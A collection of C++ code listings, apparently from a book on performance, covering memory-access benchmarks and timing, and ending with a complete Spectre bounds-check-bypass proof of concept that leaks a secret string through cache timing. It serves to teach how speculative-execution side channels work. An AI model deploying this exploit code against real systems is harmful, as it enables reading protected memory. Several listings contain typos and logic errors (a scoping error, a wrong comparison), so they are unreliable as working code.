["```cpp\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for (size_t i = 0; i < N; ++i) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0a1 += p1[i] + p2[i];\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0a2 += p1[i] * p2[i];\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0a3 += p1[i] << 2;\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0a4 += p2[i] \u2013 p1[i];\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0a5 += (p2[i] << 1)*p2[i];\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0a6 += (p2[i] - 3)*p1[i];\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\n```", "```cpp\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for (size_t i = 0; i < N; ++i) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0a1 += p1[i] + p2[i];\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0a2 += p3[i] * p4[i];\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0a3 += p1[i] << 2;\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0a4 += p2[i] - p3[i];\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0a5 += (p4[i] << 1)*p2[i];\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0a6 += (p3[i] - 3)*p1[i];\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\n```", "```cpp\nvolatile int* p = new int;\n*p = 42;\nfor (auto _ : state) {\n\u00a0\u00a0\u00a0\u00a0benchmark::DoNotOptimize(*p);\n}\ndelete p;\n```", "```cpp\nvolatile int* p = new int;\n*p = 42;\nfor (auto _ : state) {\n\u00a0\u00a0\u00a0\u00a0benchmark::DoNotOptimize(*p);\n\u00a0\u00a0\u00a0\u00a0\u2026 repeat 32 times \u2026\n\u00a0\u00a0\u00a0\u00a0benchmark::DoNotOptimize(*p);\n}\nstate.SetItemsProcessed(32*state.iterations());\ndelete p;\n```", "```cpp\ntemplate <class Word>\nvoid BM_read_seq(benchmark::State& state) {\n\u00a0\u00a0\u00a0\u00a0const size_t size = state.range(0);\n\u00a0\u00a0\u00a0\u00a0void* memory = ::malloc(size);\n\u00a0\u00a0\u00a0\u00a0void* const end = static_cast<char*>(memory) + size;\n\u00a0\u00a0\u00a0\u00a0volatile Word* const p0 = static_cast<Word*>(memory);\n\u00a0\u00a0\u00a0\u00a0Word* const p1 = static_cast<Word*>(end);\n\u00a0\u00a0\u00a0\u00a0for (auto _ : state) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for (volatile Word* p = p0; p != p1; ) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0REPEAT(benchmark::DoNotOptimize(*p++);)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0benchmark::ClobberMemory();\n\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0::free(memory);\n\u00a0\u00a0\u00a0\u00a0state.SetBytesProcessed(size*state.iterations());\n\u00a0\u00a0\u00a0\u00a0state.SetItemsProcessed((p1 - p0)*state.iterations());\n}\n```", "```cpp\n\u00a0\u00a0\u00a0\u00a0Word fill = {};\u00a0\u00a0\u00a0\u00a0// Default-constructed\n\u00a0\u00a0\u00a0\u00a0for (auto _ : state) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for (volatile Word* p = p0; p != p1; ) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0REPEAT(benchmark::DoNotOptimize(*p++ = fill);)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0benchmark::ClobberMemory();\n\u00a0\u00a0\u00a0\u00a0}\n```", "```cpp\n#define REPEAT2(x) x x\n#define REPEAT4(x) REPEAT2(x) REPEAT2(x)\n#define REPEAT8(x) REPEAT4(x) REPEAT4(x)\n#define REPEAT16(x) REPEAT8(x) REPEAT8(x)\n#define REPEAT32(x) REPEAT16(x) REPEAT16(x)\n#define REPEAT(x) REPEAT32(x)\n```", "```cpp\n#define ARGS ->RangeMultiplier(2)->Range(1<<10, 1<<30)\nBENCHMARK_TEMPLATE1(BM_read_seq, unsigned int) ARGS;\nBENCHMARK_TEMPLATE1(BM_read_seq, unsigned long) ARGS;\n```", "```cpp\n#include <emmintrin.h>\n#include <immintrin.h>\n\u2026\nBENCHMARK_TEMPLATE1(BM_read_seq, __m128i) ARGS;\nBENCHMARK_TEMPLATE1(BM_read_seq, __m256i) ARGS;\n```", "```cpp\nbenchmark::DoNotOptimize(p[rand() % size]);\n```", "```cpp\n\u00a0\u00a0\u00a0\u00a0const size_t N = size/sizeof(Word);\n\u00a0\u00a0\u00a0\u00a0std::vector<int> v_index(N); \n\u00a0\u00a0\u00a0\u00a0for (size_t i = 0; i < N; ++i) v_index[i] = i;\n\u00a0\u00a0\u00a0\u00a0std::random_shuffle(v_index.begin(), v_index.end());\n\u00a0\u00a0\u00a0\u00a0int* const index = v_index.data();\n\u00a0\u00a0\u00a0\u00a0int* const i1 = index + N;\n\u00a0\u00a0\u00a0\u00a0Word fill; memset(&fill, 0x0f, sizeof(fill));\n\u00a0\u00a0\u00a0\u00a0for (auto _ : state) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for (const int* ind = index; ind < i1; ) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0REPEAT(*(p0 + *ind++) = fill;)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0benchmark::ClobberMemory();\n\u00a0\u00a0\u00a0\u00a0}\n```", "```cpp\nREPEAT(benchmark::DoNotOptimize(*(p0 + *ind++));)\n```", "```cpp\nfor (size_t i = 0; i < N; ++i) {\n\u00a0\u00a0\u00a0\u00a0b[i] = func(a[i]);\n}\n```", "```cpp\ntemplate <class Word>\nvoid BM_write_vector(benchmark::State& state) {\n\u00a0\u00a0\u00a0\u00a0const size_t size = state.range(0);\n\u00a0\u00a0\u00a0\u00a0std::vector<Word> c(size);\n\u00a0\u00a0\u00a0\u00a0Word x = {};\n\u00a0\u00a0\u00a0\u00a0for (auto _ : state) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for (auto it = c.begin(), it0 = c.end(); it != \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0it0;) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0REPEAT(benchmark::DoNotOptimize(*it++ = x);)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0benchmark::ClobberMemory();\n\u00a0\u00a0\u00a0\u00a0}\n}\nBENCHMARK_TEMPLATE1(BM_write_vector, unsigned long)->Arg(1<<20);\n```", "```cpp\n$ perf stat -e \\\n\u00a0\u00a0cycles,instructions,L1-dcache-load-misses,L1-dcache-loads \\\n\u00a0\u00a0./program\n```", "```cpp\n std::list<std::string> data;\n\u2026 initialize the records \u2026\nfor (auto it = data.begin(), it0 = --data.end(), it1 = it;\n\u00a0\u00a0\u00a0\u00a0\u00a0true; it = it1) {\n\u00a0\u00a0\u00a0\u00a0it1 = it;\n\u00a0\u00a0\u00a0\u00a0++it1;\n\u00a0\u00a0\u00a0\u00a0const bool done = it == it0;\n\u00a0\u00a0\u00a0\u00a0if (must_change(*it)) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0std::string new_str = change(*it);\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0data.insert(it, new_str);\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0data.erase(it);\n\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0if (done) break;\n}\n```", "```cpp\nchar* buffer = get_huge_buffer();\n\u2026 initialize N records \u2026\nchar* new_buffer = get_huge_buffer();\nconst char* s = buffer;\nchar* s1 = new_buffer;\nfor (size_t i = 0; i < N; ++i) {\n\u00a0\u00a0\u00a0\u00a0if (must_change(s)) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0s1 = change(s, s1);\n\u00a0\u00a0\u00a0\u00a0} else {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0const size_t ls = strlen(s) + 1;\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0memcpy(s1, s, ls);\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0s1 += ls;\n\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0s += ls;\n}\nrelease(buffer);\nbuffer = new_buffer;\n```", "```cpp\nint a[N];\n\u00a0\u00a0\u00a0\u2026\nif (i < N) a[i] = \u2026\n```", "```cpp\nusing std::chrono::duration_cast;\nusing std::chrono::nanoseconds;\nusing std::chrono::high_resolution_clock;\nlong get_time() {\n\u00a0\u00a0\u00a0\u00a0return duration_cast< nanoseconds>(\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0high_resolution_clock::now().time_since_epoch()\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0).count();\n}\n```", "```cpp\nlong get_time() {\n\u00a0\u00a0\u00a0\u00a0unsigned int i;\n\u00a0\u00a0\u00a0\u00a0return __rdtscp(&i);\u00a0\u00a0// GCC/Clang intrinsic function\n}\n```", "```cpp\nconstexpr const size_t num_val = 256;\nstruct timing_element { char s[1024]; };\nstatic timing_element timing_array[num_val];\n::memset(timing_array, 1, sizeof(timing_array));\n```", "```cpp\nsize_t size = \u2026;\nconst char* data = \u2026;\nsize_t evil_index = \u2026;\n```", "```cpp\nconst size_t ok_index = \u2026; // Less than size\nconstexpr const size_t n_read = 100;\nfor (size_t i_read = 0; i_read < n_read; ++i_read) {\n\u00a0\u00a0\u00a0\u00a0const size_t i = (i_read & 0xf) ? ok_index : evil_index;\n\u00a0\u00a0\u00a0\u00a0if (i < size) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0access_memory(timing_array + data[i]);\n\u00a0\u00a0\u00a0\u00a0}\n}\n```", "```cpp\nvoid access_memory(const void* p) {\n\u00a0\u00a0\u00a0\u00a0__asm__ __volatile__ ( \"\" : : \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"r\"(*static_cast<const uint8_t*>(p)) : \"memory\" );\n}\n```", "```cpp\nstd::array<long, num_val> latencies = {};\nfor (size_t i = 0; i < num_val; ++i) {\n\u00a0\u00a0\u00a0\u00a0const size_t i_rand = (i*167 + 13) & 0xff;\u00a0\u00a0// Randomized\n\u00a0\u00a0\u00a0\u00a0const timing_element* const p = timing_array + i_rand;\n\u00a0\u00a0\u00a0\u00a0const long t0 = get_time();\n\u00a0\u00a0\u00a0\u00a0access_memory(p);\n\u00a0\u00a0\u00a0\u00a0latencies[i_rand] = get_time() - t0;\n}\n```", "```cpp\nfor (size_t i = 0; i < num_val; ++i) {\n\u00a0\u00a0\u00a0\u00a0_mm_clflush(timing_array + i);\u00a0\u00a0\u00a0\u00a0// Un-cache the array\n}\n```", "```cpp\nstd::unique_ptr<size_t> data_size(new size_t(size));\n```", "```cpp\n_mm_clflush(&*data_size);\nfor (volatile int z = 0; z < 1000; ++z) {}\u00a0\u00a0// Delay\nconst size_t i = (i_read & 0xf) ? ok_index : evil_index;\nif (i < *data_size) {\n\u00a0\u00a0\u00a0\u00a0access_memory(timing_array + data[i]);\n}\n```", "```cpp\nchar spectre_attack(const char* data, \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0size_t size, size_t evil_index) {\n\u00a0\u00a0constexpr const size_t num_val = 256;\n\u00a0\u00a0struct timing_element { char s[1024]; };\n\u00a0\u00a0static timing_element timing_array[num_val];\n\u00a0\u00a0::memset(timing_array, 1, sizeof(timing_array));\n\u00a0\u00a0std::array<long, num_val> latencies = {};\n\u00a0\u00a0std::array<int, num_val> scores = {};\n\u00a0\u00a0size_t i1 = 0, i2 = 0;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// Two highest scores\n\u00a0\u00a0std::unique_ptr<size_t> data_size(new size_t(size));\n\u00a0\u00a0constexpr const size_t n_iter = 1000;\n\u00a0\u00a0for (size_t i_iter = 0; i_iter < n_iter; ++i_iter) {\n\u00a0\u00a0\u00a0\u00a0for (size_t i = 0; i < num_val; ++i) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0_mm_clflush(timing_array + i);\u00a0\u00a0// Un-cache the array\n\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0const size_t ok_index = i_iter % size;\n\u00a0\u00a0\u00a0\u00a0constexpr const size_t n_read = 100;\n\u00a0\u00a0\u00a0\u00a0for (size_t i_read = 0; i_read < n_read; ++i_read) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0_mm_clflush(&*data_size);\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for (volatile int z = 0; z < 1000; ++z) {}\u00a0\u00a0// Delay\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0const size_t i = (i_read & 0xf) ? ok_index : \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0evil_index;\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (i < *data_size) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0access_memory(timing_array + data[i]);\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0for (size_t i = 0; i < num_val; ++i) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0const size_t i_rand = (i*167 + 13) & 0xff;\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// Randomized\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0const timing_element* const p = timing_array + \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0i_rand;\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0const long t0 = get_time();\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0access_memory(p);\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0latencies[i_rand] = get_time() - t0;\n\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0score_latencies(latencies, scores, ok_index);\n\u00a0\u00a0\u00a0\u00a0std::tie(i1, i2) = best_scores(scores);\n\u00a0\u00a0\u00a0\u00a0constexpr const int threshold1 = 2, threshold2 = 100;\n\u00a0\u00a0\u00a0\u00a0if (scores[i1] > \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0scores[i2]*threshold1 + threshold2) return i1;\n\u00a0\u00a0}\n\u00a0\u00a0return i1;\n}\n```", "```cpp\ntemplate <typename T> \ndouble average(const T& a, size_t skip_index) {\n\u00a0\u00a0\u00a0\u00a0double res = 0;\n\u00a0\u00a0\u00a0\u00a0for (size_t i = 0; i < a.size(); ++i) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (1 != skip_index) res += a[i];\n\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0return res/a.size();\n}\ntemplate <typename L, typename S> \nvoid score_latencies(const L& latencies, S& scores, \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0size_t ok_index) {\n\u00a0\u00a0const double average_latency = \n\u00a0\u00a0\u00a0\u00a0average(latencies, ok_index);\n\u00a0\u00a0constexpr const double latency_threshold = 0.5;\n\u00a0\u00a0for (size_t i = 0; i < latencies.size(); ++i) {\n\u00a0\u00a0\u00a0\u00a0if (ok_index != 1 && latencies[i] <\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0average_latency*latency_threshold) ++scores[i];\n\u00a0\u00a0}\n}\n```", "```cpp\ntemplate<typename S> \nstd::pair<size_t, size_t> best_scores(const S& scores) {\n\u00a0\u00a0size_t i1 = -1, i2 = -1;\n\u00a0\u00a0for (size_t i = 0; i < scores.size(); ++i) {\n\u00a0\u00a0\u00a0\u00a0if (scores[i] > scores[i1]) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0i2 = i1;\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0i1 = i;\n\u00a0\u00a0\u00a0\u00a0} else \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (i != i1 && scores[i] > scores[i2]) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0i2 = i;\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0return { i1, i2 };\n}\n```", "```cpp\nint main() {\n\u00a0\u00a0\u00a0\u00a0constexpr const size_t size = 4096;\n\u00a0\u00a0\u00a0\u00a0char* const data = new char[2*size];\n\u00a0\u00a0\u00a0\u00a0strcpy(data, \"Innocuous data\");\n\u00a0\u00a0\u00a0\u00a0strcpy(data + size, \"Top-secret information\");\n\u00a0\u00a0\u00a0\u00a0for (size_t i = 0; i < size; ++i) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0const char c =\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0spectre_attack(data, strlen(data) + 1, size + \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0i);\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0std::cout << c << std::flush;\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (!c) break;\n\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0std::cout << std::endl;\n\u00a0\u00a0\u00a0\u00a0delete [] data;\n}\n```"]